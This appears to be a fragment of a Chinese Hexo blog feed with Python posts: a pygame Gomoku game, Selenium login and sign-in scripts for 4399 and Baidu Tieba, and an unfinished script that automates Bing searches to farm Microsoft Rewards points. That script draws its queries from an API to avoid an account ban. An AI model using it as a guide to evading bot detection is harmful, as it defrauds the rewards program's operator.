class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 Pygame</span></span><br><span class="line">pygame.init()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置窗口大小和标题</span></span><br><span class="line">size = width, height = <span class="number">640</span>, <span class="number">640</span></span><br><span class="line">screen = pygame.display.set_mode(size)</span><br><span class="line">pygame.display.set_caption(<span class="string">&#x27;五子棋&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置棋盘参数</span></span><br><span class="line">grid_size = <span class="number">40</span>  <span class="comment"># 网格大小</span></span><br><span class="line">board_size = <span class="number">15</span>  <span class="comment"># 15x15的棋盘</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义颜色</span></span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">WHITE = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">BROWN = (<span class="number">205</span>, <span class="number">133</span>, <span class="number">63</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建棋盘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_board</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">return</span> [[<span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印棋盘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_board</span>(<span class="params">board</span>):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> board:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(row))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制棋盘</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_board</span>(<span class="params">screen, grid_size, board_size</span>):</span><br><span class="line">    screen.fill(BROWN)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(board_size):</span><br><span class="line">        pygame.draw.line(screen, BLACK, (grid_size + grid_size * i, grid_size),</span><br><span class="line">                         (grid_size + grid_size * i, height - grid_size), <span class="number">1</span>)</span><br><span class="line">        pygame.draw.line(screen, BLACK, (grid_size, grid_size + grid_size * i),</span><br><span class="line">                         (width - grid_size, grid_size + grid_size * i), <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制棋子</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">place_piece</span>(<span class="params">screen, grid_size, x, y, player_color</span>):</span><br><span class="line">    pygame.draw.circle(screen, player_color, (x * grid_size + grid_size // <span class="number">2</span>, y * grid_size + grid_size // <span class="number">2</span>),</span><br><span class="line">                       grid_size // <span class="number">2</span> - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查获胜条件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_win</span>(<span class="params">board, player, x, y</span>):</span><br><span class="line">    directions = [(<span class="number">0</span>, <span class="number">1</span>), (<span class="number">1</span>, <span class="number">0</span>), (<span class="number">1</span>, <span class="number">1</span>), (<span class="number">1</span>, -<span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> dx, dy <span class="keyword">in</span> directions:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>, <span class="number">5</span>):</span><br><span class="line">            nx, ny = x + dx * i, y + dy * i</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= nx &lt; <span class="built_in">len</span>(board) <span class="keyword">and</span> <span class="number">0</span> &lt;= ny &lt; <span class="built_in">len</span>(board) <span class="keyword">and</span> board[nx][ny] == player:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    running = <span class="literal">True</span></span><br><span class="line">    board = create_board(board_size)  <span class="comment"># 逻辑棋盘</span></span><br><span class="line">    player = <span class="string">&#x27;X&#x27;</span>  <span class="comment"># 初始玩家</span></span><br><span class="line">    game_over = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> running:</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">                running = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span> == pygame.MOUSEBUTTONDOWN <span class="keyword">and</span> <span class="keyword">not</span> game_over:</span><br><span class="line">                mouseX, mouseY = pygame.mouse.get_pos()</span><br><span class="line">                grid_x = mouseX // grid_size</span><br><span class="line">                grid_y = mouseY // grid_size</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 检查是否可以在这个位置放置棋子</span></span><br><span class="line">                <span class="keyword">if</span> board[grid_x][grid_y] == <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                    board[grid_x][grid_y] = player</span><br><span class="line">                    <span class="keyword">if</span> check_win(board, player, grid_x, grid_y):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;Player <span class="subst">&#123;player&#125;</span> wins!&quot;</span>)</span><br><span class="line">                        game_over = <span class="literal">True</span></span><br><span class="line">                    player = <span class="string">&#x27;O&#x27;</span> <span class="keyword">if</span> player == <span class="string">&#x27;X&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span>  <span class="comment"># 切换玩家</span></span><br><span class="line"></span><br><span class="line">        draw_board(screen, grid_size, board_size)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 绘制棋子</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(board_size):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(board_size):</span><br><span class="line">                <span class="keyword">if</span> board[x][y] == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">                    place_piece(screen, grid_size, x, y, BLACK)</span><br><span class="line">                <span class="keyword">elif</span> board[x][y] == <span class="string">&#x27;O&#x27;</span>:</span><br><span class="line">                    place_piece(screen, grid_size, x, y, WHITE)</span><br><span class="line"></span><br><span class="line">        pygame.display.flip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行游戏</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line">    pygame.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python模拟登录</title>
      <link href="/2023/11/19/python/4399/"/>
      <url>/2023/11/19/python/4399/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文是使用python模拟登录网站的两次练习总结。仅使用账号密码登录，我之后会尝试使用cookie登录。</p><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><h4 id="登录4399"><a href="#登录4399" class="headerlink" title="登录4399"></a>登录4399</h4><p>柿子要挑软的捏，所以我挑选了我的童年4399。<br>它没有可恶的人机验证，我原本想登录成功后在发出请求完成签到呢，结果登录成功就给我自动签到了。<br>按F12打开控制台找到账号密码输入框、登录按钮，仅此而已，不愧是我的童年。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的浏览器实例</span></span><br><span class="line">driver = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导航到登录页面</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://u.4399.com/login.html?refer=%2Fprofile%2F&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到包含登录表单的iframe（请将&#x27;iframe_id&#x27;替换为实际的iframe标识符）</span></span><br><span class="line">driver.switch_to.frame(<span class="string">&#x27;embed_login_frame&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待用户名输入框变得可用</span></span><br><span class="line">username_input = WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">    EC.presence_of_element_located((By.ID, <span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 找到用户名和密码输入框，并填写你的凭据</span></span><br><span class="line">username_input = driver.find_element(By.ID, <span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">password_input = driver.find_element(By.ID, <span class="string">&#x27;j-password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">username_input.send_keys(<span class="string">&#x27;aaa&#x27;</span>)  <span class="comment"># 替换为你的用户名</span></span><br><span class="line">password_input.send_keys(<span class="string">&#x27;aaa&#x27;</span>)  <span class="comment"># 替换为你的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到并点击提交按钮</span></span><br><span class="line">submit_button = driver.find_element(By.CSS_SELECTOR, <span class="string">&#x27;.ptlogin_btn&#x27;</span>)</span><br><span class="line">submit_button.click()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ... 进一步的操作，比如导航到个人资料页面等</span></span><br><span class="line"></span><br><span class="line">current_url = driver.current_url</span><br><span class="line"><span class="keyword">if</span> current_url == <span class="string">&#x27;https://u.4399.com/profile/&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;登录成功&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;登录失败&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 退出浏览器</span></span><br><span class="line"><span class="comment"># driver.quit()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="登录百度贴吧"><a href="#登录百度贴吧" class="headerlink" title="登录百度贴吧"></a>登录百度贴吧</h4><p>模拟登录时，会遇到旋转图片验证，这我就不会了，但github上有一个大佬破解了这个，我之后会尝试的。<br>我在检查登录页面时发现了从不同位置登录，账号密码的id是不同的，不知道为什么。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个新的浏览器实例</span></span><br><span class="line">driver = webdriver.Edge()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导航到登录页面</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://tieba.baidu.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到并点击登录链接</span></span><br><span class="line">login_link = driver.find_element(By.CSS_SELECTOR, <span class="string">&#x27;a[class=&quot;btn_login&quot;]&#x27;</span>)</span><br><span class="line">login_link.click()</span><br><span class="line"><span class="comment"># &lt;a rel=&quot;noopener&quot; href=&quot;#&quot; class=&quot;btn_login&quot;&gt;&lt;/a&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待登录框出现，并点击“用户名登录”链接</span></span><br><span class="line">switch_to_password_login_link = WebDriverWait(driver, <span class="number">10</span>).until(</span><br><span class="line">    EC.element_to_be_clickable((By.ID, <span class="string">&#x27;TANGRAM__PSP_4__footerULoginBtn&#x27;</span>))</span><br><span class="line">)</span><br><span class="line">switch_to_password_login_link.click()</span><br><span class="line"></span><br><span class="line"> <span class="comment"># 找到并点击“用户名登录”链接以切换到账号密码登录模式</span></span><br><span class="line"><span class="comment"># switch_to_password_login_link = driver.find_element(By.ID, &#x27;TANGRAM__PSP_42__footerULoginBtn&#x27;)</span></span><br><span class="line"><span class="comment"># switch_to_password_login_link.click()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;p class=&quot;tang-pass-footerBarULogin pass-link&quot;</span></span><br><span class="line"><span class="comment"># title=&quot;用户名登录&quot; data-type=&quot;normal&quot; id=&quot;TANGRAM__PSP_4__footerULoginBtn&quot;&gt;用户名登录&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定位用户名输入框并输入用户名</span></span><br><span class="line">username_input = driver.find_element(By.ID, <span class="string">&#x27;TANGRAM__PSP_4__userName&#x27;</span>)</span><br><span class="line">username_input.send_keys(<span class="string">&#x27;qwer1234&#x27;</span>)  <span class="comment"># 请替换为你的用户名</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定位密码输入框并输入密码</span></span><br><span class="line">password_input = driver.find_element(By.ID, <span class="string">&#x27;TANGRAM__PSP_4__password&#x27;</span>)</span><br><span class="line">password_input.send_keys(<span class="string">&#x27;Qwer1234&#x27;</span>)  <span class="comment"># 请替换为你的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定位登录按钮并点击</span></span><br><span class="line">login_button = driver.find_element(By.ID, <span class="string">&#x27;TANGRAM__PSP_4__submit&#x27;</span>)</span><br><span class="line">login_button.click()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cookies = driver.get_cookies()</span><br><span class="line">cookies_dict = &#123;cookie[<span class="string">&#x27;name&#x27;</span>]: cookie[<span class="string">&#x27;value&#x27;</span>] <span class="keyword">for</span> cookie <span class="keyword">in</span> cookies&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备请求头和参数</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://tieba.baidu.com/sign/add&#x27;</span>,  <span class="comment"># 你可能需要从浏览器中获取这个值</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;ie&#x27;</span>: <span class="string">&#x27;utf-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;kw&#x27;</span>: <span class="string">&#x27;孙笑川&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">response = requests.post(</span><br><span class="line">    <span class="string">&#x27;https://tieba.baidu.com/sign/add&#x27;</span>,</span><br><span class="line">    headers=headers,</span><br><span class="line">    params=params,</span><br><span class="line">    cookies=cookies_dict</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查响应</span></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;签到成功！&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;签到失败，状态码：<span class="subst">&#123;response.status_code&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Python自动获取微软积分</title>
      <link href="/2023/11/19/python/bing/"/>
      <url>/2023/11/19/python/bing/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在学python，尝试用python写一个自动获取微软积分的程序。但实际却没那么容易，卡在移动端获取积分好久了。<br>如果使用js写一个插件的话就很容易，但那就违背了只动一下手指的初衷，之后会尝试使用js完成的。</p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="搜索内容"><a href="#搜索内容" class="headerlink" title="搜索内容"></a>搜索内容</h4><p>我有两个账号，每天需要完成100次搜索任务，如果我将搜索内容储存在列表的话，一个月就得有三万个数据。使用随机数生成的话有被封号的风险，只能调用api了.</p><h4 id="积分获取"><a href="#积分获取" class="headerlink" title="积分获取"></a>积分获取</h4><p>我需要在运行完pc端搜索任务后切换到移动端，当该账号搜索完成后切换到下一个账号。</p><h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>目前已经完成了pc端搜索.<br>我尝试模拟移动端登录，但是失败了。如果使用模拟按键按下F12+shift+ctrl+m切换到移动端的话，会有弹窗阻碍，我正尝试解决这个问题。<br>我至今找不到我的edge浏览器驱动器。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义API的地址</span></span><br><span class="line">api_url = <span class="string">&quot;请填写api&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Edge浏览器驱动器</span></span><br><span class="line">driver = webdriver.Edge()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开Bing搜索页面（PC端）</span></span><br><span class="line">driver.get(<span class="string">&#x27;https://www.bing.com&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待一段时间以确保页面加载完成</span></span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储一言结果的列表</span></span><br><span class="line">one_words = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用API获取50次一言</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="comment"># 发送GET请求获取一言</span></span><br><span class="line">    response = requests.get(api_url)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查响应状态码</span></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment"># 解析JSON数据</span></span><br><span class="line">        data = response.json()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 获取一言内容</span></span><br><span class="line">        vhan_content = data[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;vhan&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打印并存储一言内容</span></span><br><span class="line">        <span class="built_in">print</span>(vhan_content)</span><br><span class="line">        one_words.append(vhan_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># //前30次在PC端搜索</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="comment"># 重新定位搜索框</span></span><br><span class="line">    search_box = driver.find_element(By.ID, <span class="string">&#x27;sb_form_q&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在搜索框中输入搜索词并进行搜索</span></span><br><span class="line">    search_box.clear()  <span class="comment"># 清空搜索框内容</span></span><br><span class="line">    search_box.send_keys(one_words[i])  <span class="comment"># 输入搜索词</span></span><br><span class="line">    search_box.send_keys(Keys.RETURN)  <span class="comment"># 模拟按下回车键</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待搜索结果加载完成</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭浏览器</span></span><br><span class="line"></span><br><span class="line">driver.quit()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动端方法一，失败</span></span><br><span class="line">mobile_emulation = &#123;</span><br><span class="line">    <span class="string">&quot;deviceMetrics&quot;</span>: &#123;<span class="string">&quot;width&quot;</span>: <span class="number">360</span>, <span class="string">&quot;height&quot;</span>: <span class="number">640</span>, <span class="string">&quot;pixelRatio&quot;</span>: <span class="number">3.0</span>&#125;,</span><br><span class="line">    <span class="string">&quot;userAgent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 8.0.0; Pixel 2 XL Build/OPD1.170816.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Mobile Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">options = Options()</span><br><span class="line">options.add_experimental_option(<span class="string">&quot;mobileEmulation&quot;</span>, mobile_emulation)</span><br><span class="line"></span><br><span class="line">driver = webdriver.Edge(options=options)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ...[移动端搜索代码]...</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">5</span>):</span><br><span class="line">    <span class="comment"># 在搜索框中输入一言内容并进行搜索</span></span><br><span class="line">    search_box = driver.find_element(By.ID, <span class="string">&#x27;sb_form_q&#x27;</span>)</span><br><span class="line">    search_box.clear()</span><br><span class="line">    search_box.send_keys(one_words[i])</span><br><span class="line">    search_box.send_keys(Keys.RETURN)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 等待搜索结果加载完成</span></span><br><span 